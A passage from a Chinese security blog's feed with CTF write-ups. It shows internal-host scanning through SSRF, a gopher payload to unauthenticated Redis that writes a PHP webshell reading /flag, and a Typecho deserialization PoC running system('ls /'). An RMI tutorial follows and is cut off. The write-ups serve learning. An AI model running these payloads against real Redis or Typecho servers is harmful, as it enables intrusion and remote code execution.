punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token comment\">//var_dump($match);</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'别这样'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token function\">curl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'secret'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ifconfig'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>过滤了 file://、dict、127.0.0.1、localhost，还能使用 gopher 协议和 http 协议</p>\n<p>先使用 http 服务探测存活主机，这里用 burp 的探测会卡住，简单的用 python 判断</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d3edfd3a-f06a-42ad-9bf4-fb994618272a.node4.buuoj.cn:81/index.php\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tgetdata <span class=\"token operator\">=</span> <span class=\"token string\">\"?url=http://10.244.80.\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&amp;submit=%E6%8F%90%E4%BA%A4\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\turs_l <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> getdata</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\"># print(urs_l)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tre <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>urs_l<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">except</span> requests<span class=\"token punctuation\">.</span>exceptions<span class=\"token punctuation\">.</span>RequestException<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"失败   \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\ttime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720575.png\" alt=\"image-20230405172033524\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720183.png\" alt=\"image-20230405172015095\" /></p>\n<p>接着扫描端口，6379 端口是开放的，有 redis 服务，gopher 打 ssrf，redis 的未授权访问漏洞，这里贴一下网上找到的 python2 的脚本这里改一下用 python3 跑</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 导入 quote 函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> urllib<span class=\"token punctuation\">.</span>parse <span class=\"token keyword\">import</span> quote</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>protocol <span class=\"token operator\">=</span> <span class=\"token string\">\"gopher://\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ip <span class=\"token operator\">=</span> <span class=\"token string\">\"10.244.80.203\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>port <span class=\"token operator\">=</span> <span class=\"token string\">\"6379\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shell <span class=\"token operator\">=</span> <span class=\"token string\">\"\\n\\n&lt;?php system(\\\"cat /flag\\\");?>\\n\\n\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">\"1.php\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>path <span class=\"token operator\">=</span> <span class=\"token string\">\"/var/www/html\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>passwd <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>cmd <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"flushall\"</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 清空 Redis 数据库</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>       <span class=\"token string\">\"set 1 &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 将 PHP 代码写入 Redis 中</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       <span class=\"token string\">\"config set dir &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 设置 Redis 工作目录</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       <span class=\"token string\">\"config set dbfilename &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 设置 Redis 数据库文件名</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       <span class=\"token string\">\"save\"</span>  <span class=\"token comment\"># 将 Redis 数据库保存到磁盘中</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>       <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 如果设置了密码，将 AUTH 命令添加到命令列表中</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> passwd<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    cmd<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AUTH &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 拼接 payload</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> protocol <span class=\"token operator\">+</span> ip <span class=\"token operator\">+</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">+</span> port <span class=\"token operator\">+</span> <span class=\"token string\">\"/_\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 定义 redis_format 函数，将命令转换为 Redis 格式</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">redis_format</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    CRLF <span class=\"token operator\">=</span> <span class=\"token string\">\"\\r\\n\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    redis_arr <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    cmd <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    cmd <span class=\"token operator\">+=</span> <span class=\"token string\">\"*\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>redis_arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> redis_arr<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        cmd <span class=\"token operator\">+=</span> CRLF <span class=\"token operator\">+</span> <span class=\"token string\">\"$\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> CRLF <span class=\"token operator\">+</span> x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    cmd <span class=\"token operator\">+=</span> CRLF</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">return</span> cmd</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># 将每个命令转换为 Redis 格式，并拼接到 payload 中</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> cmd<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        payload <span class=\"token operator\">+=</span> quote<span class=\"token punctuation\">(</span>redis_format<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#gopher://10.244.80.203:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></pre></td></tr></table></figure><p>访问木马文件就能拿到 flag</p>\n<h3 id=\"ez三剑客-eztypecho\"><a class=\"anchor\" href=\"#ez三剑客-eztypecho\">#</a> EZ 三剑客 - EzTypecho</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051750723.png\" alt=\"image-20230405175019643\" /></p>\n<p>直接去找 Typecho 的 cve，看到是有反序列化漏洞的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQyNC8jMHgwMQ==\"> Typecho 前台 getshell 漏洞分析 (seebug.org)</span></p>\n<p>这个直接用网上的 poc 打就行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Typecho_Request</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$_params</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$_filter</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_params</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'screenName'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ls /'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">//$this->_params['screenName'] = -1;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_filter</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Typecho_Feed</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">RSS2</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'RSS 2.0'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">/** 定义 ATOM 1.0 类型 */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">ATOM1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ATOM 1.0'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">/** 定义 RSS 时间格式 */</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">DATE_RFC822</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">/** 定义 ATOM 时间格式 */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">DATE_W3CDTF</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">/** 定义行结束符 */</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token constant\">EOL</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$_type</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$_items</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dateFormat</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_type</span> <span class=\"token operator\">=</span> <span class=\"token keyword static-context\">self</span><span class=\"token operator\">::</span><span class=\"token constant\">RSS2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$item</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'link'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token variable\">$item</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'title'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'2'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$item</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'date'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1507720298</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$item</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'author'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Typecho_Request</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$item</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'category'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Typecho_Request</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_items</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$item</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Typecho_Feed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token string single-quoted-string\">'host'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token string single-quoted-string\">'user'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token string single-quoted-string\">'charset'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'utf8'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token string single-quoted-string\">'port'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'3306'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token string single-quoted-string\">'database'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'typecho'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token string single-quoted-string\">'adapter'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token string single-quoted-string\">'prefix'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'typecho_'</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure>",
            "tags": [
                "WP",
                "GKCTF2020"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/",
            "url": "https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/",
            "title": "RMI浅记",
            "date_published": "2023-03-31T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>RMI (Remote Method Invocation) 远程方法调，是一种调用远程位置的对象来执行方法的思想，该模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。实际上就是在一个 java 虚拟机上调用另一个 java 虚拟机的对象上的方法  <code>RMI传输数据序列化后的数据</code> ，下图是 RMI 的架构在后面会详细的介绍到</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070018728.png\" alt=\"image-20230407001809673\" /></p>\n<h2 id=\"rmi流程代码\"><a class=\"anchor\" href=\"#rmi流程代码\">#</a> RMI 流程（代码）</h2>\n<p>这里是参考 su18 师傅的文章通过分析源码来了解这个 RMI</p>\n<p>首先定义一个能够远程调用的接口，这个接口需要继承 Remote 接口，用来远程调用的对象作为这个接口的实例</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token class-name\">Clown_RMI_code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Remote</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">IRemoteHelloWorld</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Remote</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">RemoteException</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>接着实现这个接口，这里继承这个接口的同时通常需要扩展 java.rmi.server.UnicastRemoteObject 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 toString 方法，在 export 时会随机绑定一个端口，监听客户端的请求，直接请求这个端口也可以通行</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token class-name\">Clown_RMI_code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>rmi<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RemoteException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token 